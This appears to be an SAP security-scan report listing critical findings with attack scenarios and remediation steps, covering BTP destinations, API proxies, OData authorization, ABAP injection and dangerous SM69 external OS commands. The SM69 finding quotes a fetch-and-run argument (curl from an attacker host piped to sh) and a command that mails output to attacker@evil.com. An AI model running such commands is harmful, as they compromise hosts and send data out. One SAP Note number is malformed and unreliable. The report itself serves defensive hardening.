1. Open the Cloud Connector administration UI (https://<scc-host>:8443) and log on with an Administrator account. 2. Navigate to 'Cloud To On-Premise' > select each Subaccount > 'Access Control' tab. 3. For every mapped backend, review the 'Resources Accessible On <virtual host>' list. 4. Remove any resource whose URL Path is '/', '/*', or a broad '/sap' entry configured as 'Path And All Sub-Paths'. 5. Re-add only the genuinely required APIs as specific paths (for example /sap/opu/odata/sap/<SERVICE>) and set the access policy to 'Path' (exact) for single-node consumers; use 'Path And All Sub-Paths' only for a tightly scoped service root. 6. Verify the protocol (HTTP/HTTPS/RFC) and virtual-to-internal host mapping for each retained entry. 7. On the backend ABAP system, deactivate unneeded ICF services in transaction SICF and enforce RFC allowlisting via UCON (transaction UCONCOCKPIT) so an over-broad mapping cannot reach sensitive nodes even if reintroduced. 8. Save; the SCC applies changes immediately with no restart required. 9. Verify from a bound BTP destination that only intended paths respond and that '/' returns HTTP 403/404 through the tunnel. 10. Rollout caution: tighten the DEV/QA subaccount first and confirm with extension/interface owners, because removing a path an iFlow silently depends on will break the integration; record a business justification per mapping and schedule a recurring SCC access-control review.
References
  • SAP BTP Cloud Connector Security Guide — Resource Access Control
  • SAP Note 2Amazon3222800 — Cloud Connector Hardening
CRITICAL P1 · 77 BTP destinations with TLS verification disabled BTP-DST-002 ▶
Security Risk
The scan found BTP destinations with TLS certificate verification disabled - the additional property TrustAll (or skipSSLValidation) set to true. TrustAll instructs the connectivity/destination runtime to accept any server certificate without validating the certificate chain or hostname, which entirely removes the authentication half of TLS and leaves only opportunistic encryption. This is a critical weakness because the destination may carry credentials, OAuth tokens, or business data to its target. Attack scenario: an adversary positioned anywhere on the network path (a compromised proxy, a rogue node, DNS or BGP hijack, or a malicious actor inside the cloud provider network) presents their own certificate; because TrustAll is set, the BTP app connects to the attacker's endpoint believing it is the real backend. The attacker performs a full man-in-the-middle attack: capturing the Basic Auth credential or bearer token, reading and altering the request/response payloads (for example changing bank details on a payment or supplier record), and relaying to the real backend to stay hidden. With the stolen credential they gain direct backend access. Business impact spans credential theft, silent transaction tampering and fraud, and exfiltration of personal/financial data - a direct breach of the SAP Security Baseline TLS requirements and of GDPR/PCI encryption-in-transit obligations. A real incident is hard to detect because traffic still flows normally while an attacker reads or modifies it.
Affected Items (2)
  • Legacy_ECC_SOAP → http://10.0.2.100/sap/bc/soap — TrustAll/SkipSSL = true
  • Test_System_Old → https://10.0.3.10/sap/opu — TrustAll/SkipSSL = true
Remediation — Step by Step
1. In the BTP cockpit, Connectivity > Destinations, filter destinations where the additional property TrustAll (or the checkbox 'Use default JDK truststore' is bypassed / skip SSL validation) is true. 2. Set TrustAll to false (or delete the property) on every affected destination - production destinations must never disable validation. 3. Obtain the correct server/CA certificate for each target and upload it to the destination service trust store (or the app's keystore) so the chain validates legitimately. 4. For self-signed or private-CA backends, import the issuing CA rather than turning off validation. 5. Ensure the target presents a certificate whose hostname matches the destination URL; fix mismatches at the target, not by disabling checks. 6. Rotate any credential/token that traversed a TrustAll destination, as it may already be compromised. 7. Verify by testing the destination ('Check Connection' in the cockpit) and confirming it succeeds with validation enabled and the proper certificate. 8. Add a policy/guardrail (and BTP audit review) to prevent TrustAll=true from being reintroduced. 9. Rollout caution: import and validate the correct certificates in a non-production destination first; a certificate/hostname mismatch will make the connection fail once TrustAll is removed, so remediate the root cause before flipping the flag in production.
References
  • SAP BTP Security Guide — Transport Layer Security
CRITICAL P1 · 77 CPI iFlows with hardcoded/embedded credentials BTP-CPI-003 ▶
Security Risk
The scan found CPI iFlows containing hardcoded or embedded credentials rather than referencing the Security Material store. Hardcoding a secret - a password, API key, or token - directly in an iFlow (in a channel property, a content modifier, a script, or an externalized-but-plaintext parameter) is a critical weakness because the credential becomes part of the integration artifact itself. It is visible to anyone who can view or edit the iFlow, it is captured in every export and every transport to other tenants, it persists in version history, and it cannot be rotated independently of a redeployment. Integration credentials typically reach backends, databases, and partner systems, so exposure is high-impact. Attack scenario: a developer with design-time access, an attacker who obtains an iFlow export or transport package, or anyone able to read the artifact extracts the plaintext secret and uses it to authenticate directly to the target system, bypassing CPI and operating with the integration user's authorizations. Because the secret travels with the artifact, a single leaked export can compromise credentials for multiple production endpoints, and rotation is slow because it requires editing and redeploying flows. Business impact is direct credential theft leading to backend/partner compromise, data exfiltration, and B2B fraud, plus a clear violation of the SAP Security Baseline and CPI security best practices which mandate externalizing secrets. A real incident involves secrets discovered in an iFlow export or repository being reused against production systems.
Affected Items (2)
  • Bank_Statement_Import — contains embedded credentials
  • Legacy_IDOC_Bridge — contains embedded credentials
Remediation — Step by Step
1. In Cloud Integration, review iFlow configurations, receiver/sender channels, content modifiers, script steps, and externalized parameters for embedded secrets. 2. Create the corresponding entries in Manage Security > Security Material (User Credentials, OAuth2 Credentials, Secure Parameter, or Keystore). 3. Refactor each iFlow to reference the credential by alias (credential name) instead of holding the literal secret; use Secure Parameter for tokens/keys that must be passed to scripts. 4. Remove every plaintext secret from the iFlow, including from script code and externalized configuration. 5. Redeploy the iFlow and confirm it authenticates via the referenced Security Material. 6. Rotate every secret that was previously hardcoded, since it must be assumed exposed (change at the target and redeploy the alias). 7. Audit prior iFlow exports/transport packages and repositories for the leaked secrets and revoke them. 8. Add a design-time review/guardrail to prevent reintroduction of hardcoded credentials. 9. Verify via Monitor Message Processing that the refactored iFlow runs successfully with no embedded secret remaining in the artifact. 10. Rollout caution: test the refactored flow in a non-production tenant first and coordinate rotation with target/partner owners so changing the now-exposed credential does not break other consumers of the same account.
References
  • SAP CPI — Security Material Externalization
CRITICAL P1 · 77 API proxies without authentication policies INTG-APIM-002 ▶
Security Risk
This finding flags active API proxies that carry no authentication policy at all - neither OAuthV2 token validation nor VerifyAPIKey - meaning any network-reachable caller can invoke them anonymously. In an S/4HANA RISE / BTP landscape these proxies typically front OData or SOAP services that read or post real business data through the Cloud Connector, so anonymous access is effectively a direct, unauthenticated channel into the backend. This is OWASP API2:2023 Broken Authentication in its most severe form: there is no identity, so there is no accountability, no scoping, and no rate attribution. Attack scenario: an attacker who learns the base path (from documentation, JS bundles, referer leakage, or simple enumeration) calls the proxy directly and receives business data or triggers a transaction with no credential required. Because the caller is anonymous, the backend often runs the request under a generic technical/communication user, so the attacker inherits whatever that user is authorized to do. This enables mass data exfiltration, unauthorized master-data or financial postings, and reconnaissance of the internal landscape, all without a single valid credential. Business impact: confirmed data breach exposure (GDPR), fraud risk on posting APIs, and a critical audit failure - unauthenticated business APIs are indefensible under the SAP Security Baseline and SOX. A real incident looks like large volumes of successful anonymous requests in the API Management access log from unexpected source IPs, with matching backend activity under a service account. The blast radius equals the authorizations of the technical user the proxy targets. This is the highest-priority class of finding in the module and should be treated as an active exposure.
Affected Items (2)
  • Payment_API (/api/v1/payments) — no authentication policy
  • Internal_Test_API (/api/test) — no authentication policy
Remediation — Step by Step
1. In API Management → API Proxies, open each flagged proxy in the Policy Editor. 2. For production APIs attach an OAuthV2 (VerifyAccessToken) policy so callers must present a valid XSUAA/IAS-issued bearer token. 3. Where token flows are not yet feasible, attach VerifyAPIKey as an interim control and issue per-consumer keys via API products. 4. Configure the proxy's XSUAA/OAuth resource so tokens are validated against the correct authorization server and audience. 5. Ensure the policy runs in the PreFlow before any target routing so unauthenticated requests are rejected early. 6. Remove any anonymous/allow-all route rules from the proxy configuration. 7. Redeploy the proxy and confirm the backend destination uses a least-privileged communication user, not a broadly authorized one. 8. Verify by calling the proxy with no token/key (expect HTTP 401) and with a valid token (expect success). 9. Review the API Management access logs for prior anonymous calls to assess whether exposure was already exploited. 10. Prefer OAuth 2.0 over API keys for all production interfaces; reserve keys for low-sensitivity or partner onboarding. Caution: coordinate credential rollout with every existing consumer before enforcing, and stage in non-prod, to avoid breaking live interfaces at cutover.
References
  • OWASP API Security — API2:2023 Broken Authentication
CRITICAL P1 · 77 API proxies operating in pass-through mode (zero policies) INTG-APIM-005 ▶
Security Risk
This finding flags API proxies operating in pure pass-through mode, with zero policies attached - no authentication, no rate limiting, no threat protection, no CORS. A zero-policy proxy adds no security value whatsoever; it is a naked tunnel that forwards any request straight to the backend S/4HANA or BTP target, defeating the entire purpose of placing an API gateway in front of the system. This is the worst-case combination of the other APIM findings at once: it is simultaneously unauthenticated (anyone can call it), unthrottled (it can be used to flood the backend), and unfiltered (malicious payloads pass untouched). Attack scenario: an attacker discovers the base path and target, then uses the proxy as an open relay to reach an internal system that would otherwise be unreachable, exfiltrating data or driving transactions under whatever technical user the target uses. Because the proxy performs no validation, it can also be abused as a pivot to probe internal endpoints and as an amplifier for denial-of-service against the backend. Business impact: direct data breach and fraud exposure, uncontrolled BTP cost, and a total breakdown of API governance - a pass-through proxy is indefensible in any audit against the SAP Security Baseline or OWASP API Security Top 10. A real incident looks like an internal service being reached from the internet via a forgotten proxy, with backend activity and data egress that no interface owner can account for. These are frequently left behind from prototyping or lift-and-shift migrations and are often undocumented. Until remediated, each such proxy should be treated as an open internal-to-external bridge.
Affected Items (2)
  • Payment_API (/api/v1/payments) → https://s4h.company.com/sap/opu/odata/sap/API_PAYMENT
  • Internal_Test_API (/api/test) → https://dev.company.com/test
Remediation — Step by Step
1. Immediately triage each pass-through proxy: determine whether it has any legitimate business owner and consumer. 2. If it is unused or orphaned, undeploy and delete it from the API runtime. 3. If it is required, attach the full baseline in the Policy Editor: authentication (OAuthV2 or VerifyAPIKey), SpikeArrest, Quota, JSON/XML threat protection, and CORS. 4. Confirm the backend destination uses a least-privileged communication user and TLS/SNC via the Cloud Connector. 5. Restrict the target route so the proxy can only reach the specific intended backend path, not arbitrary internal URLs. 6. Redeploy the proxy. 7. Verify by calling with no credential (expect 401), by exceeding the rate limit (expect 429), and with a malformed payload (expect rejection). 8. Review historical access logs for the proxy to establish whether it was already abused, and rotate any exposed backend credentials. 9. Add the proxy to the API catalogue with a named owner and documented consumers. 10. Introduce a deployment gate/policy-lint in the CI/transport pipeline that blocks promotion of any proxy with zero security policies. Caution: coordinate deletion with any hidden consumer; announce a decommission window rather than removing silently to avoid breaking an undocumented but live interface.
References
  • OWASP API Security Top 10
CRITICAL P1 · 77 Web service endpoints with weak/no authentication INTG-WS-003 ▶
Security Risk
This finding flags active SOAP web service endpoints whose authentication is None, Anonymous, blank, or transport-only, meaning any network-reachable caller can invoke them (or only the network layer stands between the caller and the backend function). Message-level authentication is the control that binds a caller identity to each SOAP request; without it, the endpoint executes under a generic user and the request is trusted purely because it arrived, which is not a security boundary at all. 'Transport-only' security (relying on TLS/network) authenticates the channel, not the caller - anyone who can reach the endpoint on the network is treated as legitimate, which fails the moment the endpoint is reachable from a broader zone than intended. Attack scenario: an attacker inside the corporate network, or via a misrouted Web Dispatcher/reverse-proxy rule, reaches an anonymous endpoint and directly invokes the backing function module - if that module is high-risk (see INTG-WS-001), the result is immediate data theft, user creation, or financial posting; if it is any business function, it is at minimum unauthorized transaction execution. Anonymous endpoints also prevent meaningful auditing, since there is no caller identity to log. Business impact: unauthorized transactions, data breach, privilege escalation, and a critical audit failure - unauthenticated business web services are indefensible under the SAP Security Baseline and SOX. A real incident looks like successful business calls in the SOAP runtime with no associated named consumer, and backend changes under a generic service user. This is critical because it combines wide reachability with zero caller accountability. Every such endpoint should be treated as an open door until authenticated.
Affected Items (3)
  • BAPI_COMPANYCODE_GETLIST — auth: NONE, transport: HTTPS
  • RFC_SYSTEM_INFO — auth: TRANSPORT, transport: HTTP
  • SXMB_MESSAGE_SEND — auth: ANONYMOUS, transport: HTTPS
Remediation — Step by Step
1. In SOAMANAGER, open each flagged service's endpoint/logical port and review the authentication settings under the security configuration. 2. Configure message-level authentication via WS-Security: X.509 client certificate, SAML bearer/holder-of-key token, or username/password combined with TLS - never rely on transport-only. 3. Bind the authenticated identity to a least-privileged communication user and constrain access with the S_SERVICE authorization object to only that service. 4. Enforce HTTPS transport (STRUST SSL PSE) so credentials/tokens are protected in transit. 5. Restrict network exposure through the Web Dispatcher / reverse proxy with source-IP allowlisting for the known consumers. 6. Where SSO/token issuance is available, prefer OAuth/SAML over static credentials. 7. Redeploy/activate the endpoint configuration. 8. Verify by calling with no credential (expect 401/authorization failure) and with a valid credential (expect success); use SAP Note 2321968 for SOAP security troubleshooting. 9. Review the Security Audit Log (SM20/RSAU) and SOAP runtime for prior anonymous calls to assess whether the endpoint was already abused. 10. Roll out in non-prod first and coordinate the credential change with each consumer to avoid outages. Caution: enabling message-level auth requires the consumer to be reconfigured simultaneously - stage the cutover and confirm partner readiness before enforcing.
References
  • SAP Note 1503579 — SOAMANAGER Authentication
CRITICAL P1 · 77 Code / call injection in custom ABAP — Z_HR_SALARY_RPT ATC-CINJ ▶
Security Risk
This was reported by SAP's own code analysis (ABAP Test Cockpit / Code Vulnerability Analyzer) running inside the system, not by this product's scanner. A value that an attacker can influence is turned into executable ABAP or into a dynamic call target — a generated subroutine pool, an INSERT REPORT, a dynamic method or a SUBMIT of a variable program name. This is remote code execution inside the application server, not a data problem: whatever the calling user could do, the injected code can do. Generated code also bypasses the transport system entirely, so what runs in production was never reviewed, never approved and does not appear in any change record.
Affected Items (1)
  • Z_HR_SALARY_RPT (CLAS) line 178
Remediation — Step by Step
1. Remove the dynamic construction. A fixed CASE over an allowlist of known program, method or subroutine names is almost always what the code actually needed. 2. Where dynamic dispatch is genuinely required, validate the target against an explicit allowlist held in customising, not against the input itself. 3. Never build ABAP source from input at runtime; if code generation is required, generate at design time and transport the result so it is reviewable. 4. Add an AUTHORITY-CHECK before the dispatch, because the check that guards the caller does not guard the target.
References
  • SAP Security Baseline — secure custom code
  • CWE-94

CRITICAL P1 · 77 OS command injection in custom ABAP — Z_CUSTOMER_EXTRACT ATC-CMDI ▶
Security Risk
This was reported by SAP's own code analysis (ABAP Test Cockpit / Code Vulnerability Analyzer) running inside the system, not by this product's scanner. An operating-system command is built from a value the caller supplies and executed from ABAP. That crosses the boundary out of the SAP application into the host, where the code runs as the SAP system user and can reach the file system, the database and the network the application server sits on. This is the shortest route from an application vulnerability to full host compromise, and it is a documented hop in this product's attack paths for exactly that reason.
Affected Items (1)
  • Z_CUSTOMER_EXTRACT (CLAS) line 203
Remediation — Step by Step
1. Open the object in ADT or SE80 and read the reported statement in context — the line number came from a scan and moves as the code is edited. 2. Remove the interpolation: use a pre-registered external command whose arguments are fixed, so the caller chooses a command rather than composes one. 3. Where an argument must vary, constrain it to an allowlist and reject anything containing shell metacharacters instead of trying to escape them. 4. Restrict who may trigger the path with an AUTHORITY-CHECK, and confirm the authorization object is one the caller does not already hold for other reasons. 5. Re-run the scan or ATC over the changed object and confirm the finding shrinks or resolves; this product tracks it to closure, so partial progress is visible. 6. Wire the check into the transport release path so the same defect class cannot be reintroduced by the next change.

CRITICAL P1 · 77 Hardcoded credentials in custom ABAP — Z_CUSTOMER_EXTRACT ATC-CRED ▶
Security Risk
This was reported by SAP's own code analysis (ABAP Test Cockpit / Code Vulnerability Analyzer) running inside the system, not by this product's scanner. A password, key or other secret is written into the source, where it is readable by anyone who can display the object and by everyone who has ever received a transport containing it. A hardcoded credential cannot be rotated without a code change and a transport, so in practice it is never rotated. It also leaves the system: source travels in transports, in support incidents and in backups, and the secret travels with it.
Affected Items (1)
  • Z_CUSTOMER_EXTRACT (CLAS) line 89
Remediation — Step by Step
1. Open the object in ADT or SE80 and read the reported statement in context — the line number came from a scan and moves as the code is edited. 2. Move the secret into the secure store the platform provides, and read it at runtime rather than embedding it. 3. Rotate the exposed value — it must be assumed compromised, because it has been readable for as long as the code has existed. 4. Where the secret authenticates to another SAP system, replace the stored password with trusted-system RFC or certificate-based authentication so there is no secret to hold. 5. Search the transport history for the same value; a credential in one object is usually in several. 6. Re-run the scan or ATC over the changed object and confirm the finding shrinks or resolves; this product tracks it to closure, so partial progress is visible.

CRITICAL P1 · 77 SQL injection in custom ABAP — Z_FI_POSTING_BAPI ATC-SQLI ▶
Security Risk
This was reported by SAP's own code analysis (ABAP Test Cockpit / Code Vulnerability Analyzer) running inside the system, not by this product's scanner. An attacker-controlled value is concatenated into an Open SQL statement — a dynamic WHERE, FROM, ORDER BY, GROUP BY or HAVING clause built from a variable. The database is asked to parse whatever arrives, so a crafted value changes which rows are read or written rather than merely which are selected. In SAP this rarely stops at data theft: the same clause frequently drives an update or a delete, so a read-only-looking report becomes a write path. The business impact is mass data exfiltration under any valid credential, and silent modification of records that the application's own authorization checks were meant to protect.
Affected Items (1)
  • Z_FI_POSTING_BAPI (CLAS) line 112
Remediation — Step by Step
1. Replace the concatenated clause with a parameterised query: bind values through the SQL statement API, or express the filter as a range table / SELECT-OPTIONS so the kernel builds the WHERE. 2. Where a dynamic clause is genuinely required, validate the constructed string against an allowlist of column names before it reaches the statement — never against a denylist of characters. 3. Escape any remaining dynamic fragment with the SAP-supplied dynamic-programming utility class rather than with hand-written quoting. 4. Re-check the authorization: a statement that can now read arbitrary rows needs the AUTHORITY-CHECK that the narrowed query previously made unnecessary.

CRITICAL P1 · 77 OData services without authorization checks FIORI-ODATA-001 ▶
Security Risk
This is the most severe finding: OData services registered with the authorization check disabled/none/false. In SAP Gateway every OData service is invokable directly over HTTP at /sap/opu/odata/sap/<SERVICE> (or /sap/opu/odata4/... for V4) independently of the Fiori UI. The Launchpad, catalogs and tiles are only a presentation layer; the real access-control boundary is the OData runtime, enforced by the S_SERVICE start authorization plus the business authorization objects checked inside the Data Provider Class (DPC/DPC_EXT) methods such as GET_ENTITYSET. If a service is registered with no authorization check, any authenticated user regardless of role can call it with a crafted request (curl, Postman, /IWFND/GW_CLIENT, or a browser) and read or, via a $batch POST/PUT/DELETE, modify business data. This completely bypasses every tile, catalog and space restriction. Attack scenario: an attacker with any valid SAP credential enumerates active services (the service document at /sap/opu/odata/ is itself readable), finds an unprotected service such as API_BUSINESS_PARTNER or a Z-service, and issues GET requests to harvest master data or $batch calls to create/modify records, no admin app required. Because a RISE/BTP landscape exposes the ABAP system's ICF endpoints to the SAP-managed network and sometimes to internet-facing reverse proxies, a lightly authenticated caller can reach these endpoints. Business impact: mass data exfiltration (GDPR breach), unauthorized financial postings (fraud/SOX) and unsafe custom DPC code paths. A real incident looks like a data-scraping run against an open OData endpoint that no UI ever exposed.
Affected Items (4)
  • API_SALES_ORDER_SRV (SO_SRV) — auth check: NONE
  • API_USER_MANAGEMENT_SRV (USER_SRV) — auth check: DISABLED
  • HCM_EMPLOYEE_MASTER_SRV (EMP_SRV) — auth check: NONE
  • Z_CUSTOM_REPORT_SRV (ZRPT_SRV) — auth check: NONE
Remediation — Step by Step
1. List active services in transaction /IWFND/MAINT_SERVICE, identify each flagged service and note its ICF node in transaction SICF (path /sap/opu/odata/...). 2. Ensure a start authorization is enforced: maintain S_SERVICE default values in transaction SU24 for the service (object type IWSG for the gateway service, IWSV/G4BA for the backend service) so PFCG roles carry the correct S_SERVICE. 3. Verify authorization is actually coded in the backend DPC_EXT: GET_ENTITYSET/GET_ENTITY/CREATE_ENTITY must call AUTHORITY-CHECK against the relevant business objects; raise a development change for any custom service lacking it, since model metadata alone does not enforce access. 4. Deactivate services that are registered but not required, by removing the service in /IWFND/MAINT_SERVICE or disabling the ICF node in SICF, to shrink the attack surface. 5. Enforce the UCON HTTP Allowlist (transaction UCONCOCKPIT, table HTTP_WHITELIST, delivered with SAP Note 2573569) so only approved ICF endpoints are reachable. 6. Ensure strong authentication (SSO/OAuth 2.0 per SAP Note 2500104) and confirm no anonymous/alias ICF logon is configured on these nodes. 7. Verify: from /IWFND/GW_CLIENT or curl call the service as a user WITHOUT the intended role and confirm HTTP 403; review /IWFND/ERROR_LOG for the denied call. KBA 3165869 documents the expected no-authorization behavior. 8. Rollout caution: enforcing checks can break integrations, so first run STAUTHTRACE / the Security Audit Log in QA to find all legitimate callers, provision them the correct roles, coordinate with interface owners, then enforce via transport into production.
References
  • SAP Note 2926224 — OData Service Authorization
  • OWASP — API Authorization
CRITICAL P1 · 77 Unrestricted external OS-command execution (S_LOG_COM) AUTH-003 ▶
Security Risk
The role grants S_LOG_COM with COMMAND='*' and HOST='*'. S_LOG_COM authorizes the execution of external operating-system commands defined via SM69 and run via SM49 (or programmatically through function module SXPG_COMMAND_EXECUTE over RFC). With both COMMAND and HOST wildcarded, the holder can run essentially any external OS command on any application-server host in the system. This is a direct bridge off the ABAP stack down to the operating system running under the <sid>adm service account. An attacker uses it to read or exfiltrate files (the secure store / SSFS, transport files, kernel profiles), write a web shell or cron/at job, add themselves to an OS group, tamper with the database at the file level, or pivot laterally to other hosts sharing the same infrastructure. In an S/4HANA RISE context, even though the hyperscaler/SAP manages the infrastructure layer, OS-command execution inside the managed hosts still exposes the application secrets and can undermine the shared-responsibility boundary. Because the command list in SM69 can also contain parameter substitution, a poorly defined command plus wildcard authorization can be weaponized (argument injection) even without adding a new command. A real incident looks like an unexpected OS process spawned by the SAP work process, an outbound network connection from the app server, or modified files on the SAP mount — with the trigger being an SM49 execution or an RFC call to SXPG_COMMAND_EXECUTE from a semi-privileged user, mapping straight to CIS/DSAG critical-authorization findings and to a full host compromise.
Affected Items (1)
  • Role Z_BASIS_SUPER — 2 user(s) [ADMIN1, CONTRACTOR7] — S_LOG_COM COMMAND/HOST/OPSYSTEM = *
Remediation — Step by Step
1. Find offenders: run RSUSR002 for S_LOG_COM with COMMAND='*' and/or HOST='*'; record roles and holders. 2. In PFCG, restrict S_LOG_COM to the specific, named external commands and target hosts each role must run; never leave COMMAND or HOST as '*'. 3. Review the defined external commands themselves in SM69: remove unused or dangerous commands, and ensure no command allows additional/free parameters that permit argument injection. 4. Tightly restrict who can maintain (SM69) and execute (SM49) external commands; separate the maintain and execute duties. 5. Restrict the RFC path too: ensure S_RFC does not expose the SXPG function group broadly (see AUTH-006) and apply UCON allowlisting to SXPG_COMMAND_EXECUTE. 6. Regenerate profiles and re-run RSUSR002 to confirm no S_LOG_COM wildcard remains in assigned roles. 7. Verify: with a test user, attempt SM49 for a non-authorized command and confirm the authorization is refused (SU53). 8. Enable the Security Audit Log (RSAU_CONFIG) for external-command execution and monitor SM49 usage. 9. Rollout caution: OS commands are frequently used by legitimate batch/monitoring jobs — confirm with the job/interface owners which commands are in use before narrowing, test in QA, and keep a rollback role version.
References
  • SAP Security Baseline — S_LOG_COM
  • SAP Help — SM49 External OS Commands
CRITICAL P1 · 77 External OS command wraps a shell / interpreter JOBCMD-CMD-001 ▶
Security Risk
The SM69 external-OS-command catalog (table SXPGCOSTAB) is meant to be an allowlist: each logical command maps to one fixed executable, runnable via SM49 or the ABAP function module SXPG_COMMAND_EXECUTE. This command's OPCOMMAND instead invokes a shell or interpreter (sh, bash, ksh, cmd.exe, powershell, python, perl...) or embeds shell metacharacters ( | ; & ` $( > < ). Wrapping a shell collapses the allowlist: the 'one program' is now an interpreter that will run whatever string it is handed. The command executes on the SAP application-server host as the OS service user <sid>adm - owner of the kernel, profiles, work directory, and with reach to the HANA data files. Attack scenario: a holder of authorization object S_LOG_COM for this command calls SXPG_COMMAND_EXECUTE, or schedules an SM36 external-command step. They pass an argument such as -c "curl http://attacker/x | sh"; the wrapped shell interprets it and the host runs arbitrary attacker code. Because execution is as <sid>adm, the attacker can read/modify data at the DB filesystem, stop/start the instance, and plant persistence. In S/4HANA this means direct exposure of FI/CO, MM and HR/PA data and the ability to tamper with transports and the kernel. It bypasses every ABAP-layer control (SoD, tcode/table authorization) because the action happens at the OS, not through the application. Business impact: full application-server compromise, typically a reportable data breach and a loss of platform integrity. A real incident: an SM69 command 'ZBACKUP' defined as /bin/sh -c, kept for operator convenience, was later abused to open a reverse shell. The only forensic trace was the SM49/SXPG execution log and OS process accounting - easy to miss without OS-level monitoring.
Affected Items (2)
  • ZBADSHELL -> /bin/sh -c id (wraps a shell/interpreter)
  • ZPIPE -> /usr/bin/logger | /usr/bin/mail attacker@evil.com (contains shell metacharacters)
Remediation — Step by Step
1. Inventory every command: SM69 (or SE16 on table SXPGCOSTAB) and flag OPCOMMAND values that are shells/interpreters or contain | ; & ` $ ( ) > <. 2. For each offender, in SM69 redefine 'Operating system command' to the specific target executable with a fully-qualified absolute path and no shell wrapper. 3. Remove all shell metacharacters from the command and the 'Parameters' field; if the entry exists only to launch a shell, delete it in SM69. 4. Before deleting, confirm no armed job step references it (check table TBTCP field EXTCMD via SE16 / SM37). 5. Restrict execution: scope authorization object S_LOG_COM (fields COMMAND, OPSYSTEM, HOST) to a minimal operator role in PFCG. 6. List current S_LOG_COM holders with SUIM ('Users by Authorization Values') and remove broad grants. 7. Harden the gateway that starts SAPXPG: maintain the secinfo file (profile parameter gw/sec_info) and set gw/reg_no_conn_info per SAP gateway-security guidance. 8. Keep ADDPAR off for these commands (see JOBCMD-CMD-002) so no run-time argument can re-introduce a shell. 9. Verify: re-run SM49 for the changed command with a benign argument and confirm no shell interpretation; re-scan SXPGCOSTAB. 10. Rollout caution: OPCOMMAND changes can break interfaces/batch - test in DEV/QA, coordinate with job owners (TBTCO-SDLUNAME), and move via transport (SE09/SE10) rather than editing directly in PRD.
References
  • SAP Help — Maintaining External OS Commands (SM49/SM69)
  • SecurityBridge — SAP OS Command Injection (SAPXPG)
CRITICAL P2 · 65 Parameter rsau/enable non-compliant PARAM-rsau/enable ▶
Security Risk
rsau/enable turns on the SAP Security Audit Log (SAL), the primary forensic and detective control for the ABAP system - it records security-relevant events such as successful/failed logons, RFC calls, transaction/report starts, user-master and authorization changes, and debug activity. If rsau/enable is 0 (the kernel default) or the SAL is otherwise not active, the system generates no reliable security audit trail. This is dangerous because it blinds both real-time monitoring and post-incident forensics: an attacker who takes over an account or abuses privileges leaves little trace, and investigators cannot reconstruct what was accessed or changed. In an S/4HANA RISE landscape the SAL is a customer-owned control and the key data source feeding SIEM/SOC detections; without it, detections for brute force, SAP* usage, debug-and-replace fraud, and mass downloads simply have no telemetry. Attack scenario: an insider posts fraudulent payments or exfiltrates data via debugger field manipulation, and because the SAL is off there is no record of the debug events or the RFC calls, so the fraud is neither detected nor provable. Business impact: undetectable fraud/data breach, inability to meet breach-notification and evidentiary obligations, and failed audits. Compliance impact: violates SAP Note 2191612, CIS SAP 6.1, SAP Security Baseline logging requirements, and SOX/GDPR monitoring/accountability duties - correctly rated CRITICAL. A real incident would surface as a suspected fraud that cannot be investigated because no audit trail exists.
Affected Items (1)
  • rsau/enable = 0
Remediation — Step by Step
1. On S/4HANA (SAP_BASIS 7.50+) configure the Security Audit Log via RSAU_CONFIG (the successor to SM19); on older releases use SM19. Note that on 7.40+ SAL 'kernel parameters' set in RSAU_CONFIG override the rsau/* profile parameters. 2. Activate logging: in RSAU_CONFIG set 'Static security audit active' (equivalent to rsau/enable = 1) and, if using profile parameters, set rsau/enable = 1 in RZ10. 3. Configure sufficient filters/selection slots (rsau/selection_slots, e.g. 10+) to capture logons (esp. failed), RFC logons/calls, transaction/report starts, user and authorization changes, and debug events - at minimum for critical users (SAP*, DDIC, admins, emergency IDs) and all users for high-severity events. 4. Enable log integrity protection (rsau/integrity = 1) and set DIR_AUDIT / FN_AUDIT (or the kernel-parameter equivalents) so logs are written to a protected location with adequate retention. 5. Save/activate; rsau parameters are dynamically switchable via RSAU_CONFIG, but persist the profile values in RZ10 so the setting survives restarts. 6. Verify events are being recorded by generating a test failed logon and reading it back in SM20 / RSAU_READ_LOG. 7. Forward the SAL to the SIEM/SOC (e.g. via RSAU integration or log shipping) so detections have data. 8. In RISE/ECS confirm log retention and access are aligned with the SAP-managed operations responsibilities. 9. Roll out in DEV/QA first to size the filters and avoid excessive log volume, then enable in production. 10. Re-run the scanner to confirm rsau/enable / SAL is active.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
CRITICAL P2 · 65 No active security audit filters configured NET-008 ▶
Security Risk
This check flags the absence of any active Security Audit Log (SAL) filters, meaning the ABAP Security Audit Log (configured via SM19 on older releases or RSAU_CONFIG on S/4HANA) is effectively not recording security-relevant events. Without active filters the system does not capture dialog and RFC logon successes and failures, transaction and report starts, RFC function-module calls, user-master and role/authorization changes, debugging activity, or audit-configuration changes. The consequence is a near-total loss of the forensic and detection trail. From an attacker's perspective this is ideal operating conditions: reconnaissance, credential abuse, privilege escalation, and data theft can all proceed with no durable record, and any tracks in transient logs are easy to lose. For defenders it means incident response is blind, alerting is impossible, and there is no evidence to support investigations, non-repudiation, or regulatory inquiries. In an S/4HANA RISE model the customer generally retains responsibility for configuring the ABAP-layer Security Audit Log, so its absence is a critical governance and shared-responsibility gap rather than something the provider covers. The impact includes an undetectable breach, failure of SOX logging and monitoring controls, inability to demonstrate GDPR-required accountability, and adverse audit opinions.
